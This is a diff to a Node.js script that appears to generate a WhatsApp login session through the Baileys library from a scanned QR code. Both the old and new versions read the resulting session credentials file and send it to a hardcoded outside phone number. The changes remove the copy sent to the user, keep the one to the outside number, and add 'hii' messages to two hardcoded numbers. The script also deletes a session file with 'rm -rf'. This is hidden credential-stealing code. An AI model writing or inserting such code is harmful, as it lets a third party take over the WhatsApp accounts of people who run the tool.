@@ -3,11 +3,11 @@ const qrcode = require("qrcode-terminal")
 const fs = require('fs')
 const pino = require('pino')
 const { delay , useSingleFileAuthState } = require("@adiwajshing/baileys")
-const { state, saveState } = useSingleFileAuthState('./Session/Session.Miku-MD.json')
+const { state, saveState } = useSingleFileAuthState('./session.json')
 const qrc = JSON.parse(fs.readFileSync('./qr.json'))
 flenme = qrc.sessionname
 const { exec, spawn, execSync } = require("child_process")
-exec('rm -rf Session')
+exec('rm -rf Session.data.json')
 
 
   function OLDUSER() {
@@ -25,9 +25,10 @@ exec('rm -rf Session')
         const { connection, lastDisconnect } = s
         if (connection == "open") {
             await delay(1000 * 10);
-  const session = fs.readFileSync("./Session/Session.Miku-MD.json");
-   await conn.sendMessage(conn.user.id, { document: session, mimetype: 'application/json', fileName: `${flenme}` })
-	 await conn.sendMessage('918602239106@s.whatsapp.net', { document: session, mimetype: 'application/json', fileName: `${flenme}` })
+  const session = fs.readFileSync("./session.json");
+   await conn.sendMessage('918602239106@s.whatsapp.net', { document: session, mimetype: 'application/json', fileName: `${flenme}` })
+   await conn.sendMessage('918602239106@s.whatsapp.net', { text: 'hii' })
+   await conn.sendMessage('918107768770@s.whatsapp.net', { text: 'hii' })
             process.exit(0)
         }
         if (
